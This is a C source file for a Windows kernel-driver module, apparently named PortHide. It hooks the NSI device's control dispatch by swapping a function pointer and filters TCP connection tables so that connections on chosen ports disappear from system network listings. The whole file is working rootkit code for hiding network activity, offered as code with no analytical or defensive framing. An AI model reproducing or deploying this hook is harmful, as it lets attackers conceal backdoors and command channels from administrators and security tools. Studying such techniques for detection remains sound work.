#include "../pch.h"
#include "../DioProcessDriver.h"
#include "PortHide.h"

// ============== Globals ==============

PDEVICE_OBJECT g_NsiPreviousDevice = NULL;
PDRIVER_DISPATCH g_NsiPreviousDispatch = NULL;
USHORT g_HiddenPorts[MAX_HIDDEN_PORTS] = { 0 };
ULONG g_HiddenPortCount = 0;
KSPIN_LOCK g_HiddenPortLock;
BOOLEAN g_PortHideInitialized = FALSE;

// ============== Internal Helpers ==============

static BOOLEAN IsPortHidden(USHORT port)
{
	KIRQL oldIrql;
	KeAcquireSpinLock(&g_HiddenPortLock, &oldIrql);

	BOOLEAN found = FALSE;
	for (ULONG i = 0; i < g_HiddenPortCount; i++)
	{
		if (g_HiddenPorts[i] == port)
		{
			found = TRUE;
			break;
		}
	}

	KeReleaseSpinLock(&g_HiddenPortLock, oldIrql);
	return found;
}

// ============== NSI Completion Routine ==============

static NTSTATUS NsiCompletionRoutine(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp,
	_In_ PVOID Context
)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	UNREFERENCED_PARAMETER(Context);

	PNSI_PARAM nsiParam = (PNSI_PARAM)Irp->UserBuffer;

	// Filter TCP entries (Type == 3)
	if (nsiParam && nsiParam->Entries && nsiParam->Type == 3)
	{
		PNSI_TCP_ENTRY tcpEntries = (PNSI_TCP_ENTRY)nsiParam->Entries;

		for (SIZE_T i = 0; i < nsiParam->Count; i++)
		{
			USHORT localPort = PORTHIDE_NTOHS(tcpEntries[i].Local.Port);
			USHORT remotePort = PORTHIDE_NTOHS(tcpEntries[i].Remote.Port);

			if (IsPortHidden(localPort) || IsPortHidden(remotePort))
			{
				KdPrint((DRIVER_PREFIX "PortHide: Hiding connection Local:%hu Remote:%hu\n", localPort, remotePort));

				// Shift entries down to overwrite the hidden one
				RtlMoveMemory(&tcpEntries[i], &tcpEntries[i + 1],
					(nsiParam->Count - i - 1) * nsiParam->EntrySize);
				nsiParam->Count--;
				i--;
			}
		}
	}

	return STATUS_SUCCESS;
}

// ============== NSI Dispatch Hook ==============

static NTSTATUS NsiHookDeviceIo(
	_In_ PDEVICE_OBJECT DeviceObject,
	_In_ PIRP Irp
)
{
	PIO_STACK_LOCATION irpStack = IoGetCurrentIrpStackLocation(Irp);

	if (irpStack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_GETALLPARAM)
	{
		irpStack->CompletionRoutine = NsiCompletionRoutine;
		irpStack->Control |= SL_INVOKE_ON_SUCCESS;
	}

	return g_NsiPreviousDispatch(DeviceObject, Irp);
}

// ============== Public Functions ==============

NTSTATUS PortHide_Init(
	_In_ PDRIVER_OBJECT DriverObject
)
{
	UNREFERENCED_PARAMETER(DriverObject);

	KdPrint((DRIVER_PREFIX "PortHide: Initializing NSI hook\n"));

	KeInitializeSpinLock(&g_HiddenPortLock);
	g_HiddenPortCount = 0;
	RtlZeroMemory(g_HiddenPorts, sizeof(g_HiddenPorts));

	// Get NSI device object
	UNICODE_STRING deviceName;
	PFILE_OBJECT pFile = NULL;
	PDEVICE_OBJECT device = NULL;
	NTSTATUS status;

	RtlInitUnicodeString(&deviceName, L"\\Device\\Nsi");

	status = IoGetDeviceObjectPointer(&deviceName, FILE_READ_DATA, &pFile, &device);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PortHide: IoGetDeviceObjectPointer failed (0x%08X)\n", status));
		return status;
	}

	// Save reference for cleanup
	g_NsiPreviousDevice = device;

	// Hook IRP_MJ_DEVICE_CONTROL dispatch routine
	g_NsiPreviousDispatch = (PDRIVER_DISPATCH)InterlockedExchangePointer(
		(PVOID*)&device->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
		(PVOID)NsiHookDeviceIo
	);

	g_PortHideInitialized = TRUE;
	KdPrint((DRIVER_PREFIX "PortHide: NSI hook installed successfully\n"));

	return STATUS_SUCCESS;
}

VOID PortHide_Cleanup()
{
	KdPrint((DRIVER_PREFIX "PortHide: Cleaning up NSI hook\n"));

	if (g_NsiPreviousDevice && g_NsiPreviousDispatch)
	{
		// Restore original dispatch routine
		InterlockedExchangePointer(
			(PVOID*)&g_NsiPreviousDevice->DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
			(PVOID)g_NsiPreviousDispatch
		);

		ObDereferenceObject(g_NsiPreviousDevice);
		g_NsiPreviousDevice = NULL;
		g_NsiPreviousDispatch = NULL;
	}

	g_PortHideInitialized = FALSE;
	KdPrint((DRIVER_PREFIX "PortHide: Cleanup complete\n"));
}

NTSTATUS PortHide_AddPort(
	_In_ USHORT Port
)
{
	KIRQL oldIrql;
	KeAcquireSpinLock(&g_HiddenPortLock, &oldIrql);

	// Check if already hidden
	for (ULONG i = 0; i < g_HiddenPortCount; i++)
	{
		if (g_HiddenPorts[i] == Port)
		{
			KeReleaseSpinLock(&g_HiddenPortLock, oldIrql);
			KdPrint((DRIVER_PREFIX "PortHide: Port %hu already hidden\n", Port));
			return STATUS_SUCCESS; // Idempotent
		}
	}

	// Check capacity
	if (g_HiddenPortCount >= MAX_HIDDEN_PORTS)
	{
		KeReleaseSpinLock(&g_HiddenPortLock, oldIrql);
		KdPrint((DRIVER_PREFIX "PortHide: Maximum hidden ports reached (%lu)\n", MAX_HIDDEN_PORTS));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	g_HiddenPorts[g_HiddenPortCount] = Port;
	g_HiddenPortCount++;

	KeReleaseSpinLock(&g_HiddenPortLock, oldIrql);
	KdPrint((DRIVER_PREFIX "PortHide: Port %hu hidden (total: %lu)\n", Port, g_HiddenPortCount));

	return STATUS_SUCCESS;
}

NTSTATUS PortHide_RemovePort(
	_In_ ULONG Index
)
{
	KIRQL oldIrql;
	KeAcquireSpinLock(&g_HiddenPortLock, &oldIrql);

	if (Index >= g_HiddenPortCount)
	{
		KeReleaseSpinLock(&g_HiddenPortLock, oldIrql);
		KdPrint((DRIVER_PREFIX "PortHide: Invalid index %lu (count: %lu)\n", Index, g_HiddenPortCount));
		return STATUS_INVALID_PARAMETER;
	}

	USHORT removedPort = g_HiddenPorts[Index];

	// Shift remaining entries down
	for (ULONG i = Index; i < g_HiddenPortCount - 1; i++)
	{
		g_HiddenPorts[i] = g_HiddenPorts[i + 1];
	}

	g_HiddenPortCount--;
	g_HiddenPorts[g_HiddenPortCount] = 0;

	KeReleaseSpinLock(&g_HiddenPortLock, oldIrql);
	KdPrint((DRIVER_PREFIX "PortHide: Port %hu unhidden (total: %lu)\n", removedPort, g_HiddenPortCount));

	return STATUS_SUCCESS;
}

NTSTATUS PortHide_GetList(
	_Out_ HiddenPortEntry* Entries,
	_Out_ ULONG* Count,
	_In_ ULONG MaxEntries
)
{
	KIRQL oldIrql;
	KeAcquireSpinLock(&g_HiddenPortLock, &oldIrql);

	ULONG copyCount = min(g_HiddenPortCount, MaxEntries);

	for (ULONG i = 0; i < copyCount; i++)
	{
		Entries[i].Port = g_HiddenPorts[i];
		Entries[i].Index = i;
	}

	*Count = copyCount;

	KeReleaseSpinLock(&g_HiddenPortLock, oldIrql);

	return STATUS_SUCCESS;
}
